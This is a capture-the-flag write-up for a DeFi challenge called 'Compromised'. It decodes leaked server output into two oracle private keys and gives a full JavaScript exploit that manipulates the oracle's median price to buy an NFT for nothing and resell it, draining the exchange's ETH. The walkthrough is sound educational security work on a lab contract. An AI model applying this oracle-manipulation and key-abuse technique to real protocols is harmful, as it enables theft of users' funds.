# Compromised

## Challenge

While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:

```bash
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

A related on-chain exchange is selling (absurdly overpriced) collectibles called "DVNFT", now at 999 ETH each

This price is fetched from an on-chain oracle, and is based on three trusted reporters: `0xA73209FB1a42495120166736362A1DfA9F95A105`,`0xe92401A4d3af5E446d93D11EEc806b1462b39D15` and `0x81A5D6E50C214044bE44cA0CB057fe119097850c`.

Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.

## Solution

We see that the only place where the `Exchange.sol` contract is sending funds without much control funds to an external source is when calling its function `sellOne`, through the following operation

```solidity
payable(msg.sender).sendValue(currentPriceInWei);
```

We see that `currentPriceInWei` is the median price of the `DVNFT` provided by the oracles. This means that if we want to drain the exchange, we need to make the median price really high when selling an NFT by manipulating at least two out of the three trusted sources. But first we need to buy one NFT to sell, and since we can modify its selling price too, we can then buy it very cheap and sell for very expensive.

When we examine the response from the server, we see it is in hexadecimal. When decoding it to text, we obtain the following two strings

```bash
MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5

MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
```

If you are familiar with Javascript, this looks like a base64 encription. By decoding these two values we obtain,

```bash
0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9

0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
```

These values are 64 bytes hexadecimal long, the exact size of private keys in Ethereum. We can verify the address they correspond to by using the `ethers` library

```javascript
wallet1 = new ethers.Wallet(
  "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"
)
console.log(wallet1.address) //0xe92401A4d3af5E446d93D11EEc806b1462b39D15

wallet2 = new ethers.Wallet(
  "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
)
console.log(wallet2.address) //0x81A5D6E50C214044bE44cA0CB057fe119097850c
```

Perfect, we have complete control over two of the trusted oracles, and we can perform our attack. This time we will perform the whole attack from the script in [`compromised.challenge.js`](../../test/compromised/compromised.challenge.js), adding the following code

```javascript
it("Exploit", async function () {
  /** CODE YOUR EXPLOIT HERE */
  let wallet1 = new ethers.Wallet(
    "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"
  )
  let wallet2 = new ethers.Wallet(
    "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
  )
  wallet1 = await wallet1.connect(ethers.provider)
  wallet2 = await wallet2.connect(ethers.provider)
  const oracle1 = await this.oracle.connect(wallet1)
  const oracle2 = await this.oracle.connect(wallet2)

  // Set Price of DVNFT to 0
  await oracle1.postPrice("DVNFT", ethers.utils.parseEther("0"))
  await oracle2.postPrice("DVNFT", ethers.utils.parseEther("0"))

  // Buy the token for 0 ethers, send value > 0 to pass require
  const AttackedExchange = await this.exchange.connect(attacker)
  const buyTx = await AttackedExchange.buyOne({
    value: ethers.utils.parseEther("0.01"),
  })
  const response = await buyTx.wait()
  const event = response.events.find((event) => event.event === "TokenBought")
  const [, tokenId] = event.args

  // Increase the price of the DVNFT
  await oracle1.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE)
  await oracle2.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE)

  // Approve and sell the token at the price above
  const AttackerToken = await this.nftToken.connect(attacker)
  AttackerToken.approve(this.exchange.address, tokenId)
  await AttackedExchange.sellOne(tokenId)

  // Set the price of the NFT token to the initial proce
  await oracle1.postPrice("DVNFT", INITIAL_NFT_PRICE)
  await oracle2.postPrice("DVNFT", INITIAL_NFT_PRICE)
})
```

As described, we first create the oracle wallets and connect them to the provider. Then we create signed instances `oracle1` and `oracle2` of the `TrustfulOracle.sol` by these two sources. We can then use teh function `postPrice` to set the price of `DVNFT` to 0 in order to buy. In order to get the `tokenId` of the token we buy, we use the emitted event `TokenBought`. Then we increase the median price of `DVNFT` to the total balance of `Exchange` and we sell the token we had, draining all the funds of it. Since we are nice people, we set the price back to the initial price after the attack.
